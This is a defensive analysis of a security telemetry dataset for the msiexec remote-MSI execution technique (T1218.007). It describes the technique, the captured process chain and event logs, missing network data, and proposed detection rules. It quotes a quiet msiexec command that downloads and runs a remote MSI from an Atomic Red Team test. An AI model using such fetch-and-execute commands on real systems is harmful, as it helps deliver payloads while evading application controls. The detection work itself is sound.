# T1218.007-11: Msiexec — Msiexec.exe - Execute Remote MSI file

## Technique Context

T1218.007 - Msiexec is a defense evasion technique where adversaries abuse msiexec.exe, the Windows Installer service binary, to proxy execution of malicious content. Msiexec.exe is a trusted, signed Microsoft binary that can install Microsoft Installer (MSI) packages from both local and remote sources. The detection community focuses on monitoring msiexec execution with unusual command-line parameters, particularly when downloading and executing remote MSI files, as this provides a mechanism to bypass application whitelisting and potentially deliver malicious payloads while appearing legitimate.

Attackers leverage this technique because msiexec.exe can download files from remote URLs, execute embedded scripts within MSI packages, and run with elevated privileges when needed for software installation. The technique is particularly valuable for initial access, persistence, and defense evasion as it uses a legitimate system utility that security tools may trust.

## What This Dataset Contains

This dataset captures a successful execution of msiexec downloading and executing a remote MSI file containing JScript code. The attack chain shows:

**Process execution chain captured in Security 4688 events:**
- PowerShell → cmd.exe → msiexec.exe (initial) → msiexec.exe (embedding) → powershell.exe

**Key command lines from Security events:**
- `"cmd.exe" /c c:\windows\system32\msiexec.exe /q /i "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.007/bin/T1218.007_JScript.msi"`
- `c:\windows\system32\msiexec.exe  /q /i "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.007/bin/T1218.007_JScript.msi"`
- `C:\Windows\System32\MsiExec.exe -Embedding 18C55D6DF54D7DAA68170388F440A2A0 E Global\MSI0000`
- `"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -nop -Command Write-Host JScript executed me!; exit`

**Sysmon ProcessCreate (EID 1) events** show the same process chain with additional details like process GUIDs, hashes, and parent-child relationships.

**Application event log (EIDs 1040, 1033, 11707)** documents the MSI installation process, showing successful installation of "Atomic Red Team Test Installer" from the remote URL.

**Sysmon ImageLoad (EID 7) events** capture msiexec loading scripting-related DLLs including `wshom.ocx` (Windows Script Host Runtime Library) and `scrrun.dll` (Microsoft Script Runtime), indicating script execution capability.

**PowerShell 4104 script block logging** captures the actual payload execution: `Write-Host JScript executed me!; exit`.

## What This Dataset Does Not Contain

The dataset lacks network connection events showing the actual download of the MSI file from GitHub - no Sysmon EID 3 (NetworkConnect) events are present for the HTTP/HTTPS connection to download the MSI. This is likely due to the sysmon-modular configuration not capturing all network connections or the download occurring through a different process context.

No DNS resolution events (Sysmon EID 22) are captured for the github.com domain resolution, which would provide additional network-based detection opportunities.

File write events for the downloaded MSI file itself are not present in the data, though we do see temporary file creation (`C:\Windows\Installer\MSI8F6F.tmp`) during the installation process.

The dataset doesn't contain any Windows Defender alerts or blocks despite real-time protection being active, indicating this test MSI was not flagged as malicious.

## Assessment

This dataset provides excellent telemetry for detecting T1218.007 MSI proxy execution. The combination of Security 4688 process creation events with full command-line logging and Sysmon ProcessCreate events creates robust detection opportunities. The presence of Application event logs adds valuable context about the MSI installation process that many environments don't collect.

The process execution chain is clearly visible across multiple data sources, and the command-line arguments provide high-fidelity indicators. The PowerShell script block logging successfully captured the payload execution, demonstrating end-to-end attack visibility.

The main limitation is the absence of network telemetry, which would strengthen detections by providing additional context about remote MSI downloads. However, the process-based telemetry is comprehensive enough to support strong detection rules.

## Detection Opportunities Present in This Data

1. **Remote MSI execution detection** - Monitor Security 4688 for msiexec.exe with `/i` parameter and URLs in command line arguments, particularly HTTPS URLs
2. **MSI download from internet domains** - Alert on msiexec.exe command lines containing external domains like github.com, especially in combination with `/q` (quiet) flag
3. **Msiexec embedding process creation** - Track msiexec.exe creating child processes with `-Embedding` parameter followed by child PowerShell processes
4. **Script execution from MSI context** - Correlate Application event 1033 (MSI installation) with subsequent PowerShell process creation from msiexec parent process
5. **Sysmon ImageLoad correlation** - Alert when msiexec.exe loads scripting-related DLLs (wshom.ocx, scrrun.dll) indicating embedded script capabilities
6. **Temporary MSI file creation** - Monitor Sysmon EID 11 for file creation in `C:\Windows\Installer\` with MSI*.tmp pattern during suspicious msiexec execution
7. **PowerShell script block analysis** - Hunt for PowerShell 4104 events with parent process msiexec.exe to identify payload execution
8. **Process privilege adjustment** - Correlate Security 4703 privilege adjustment events with msiexec.exe processes to identify elevated MSI executions
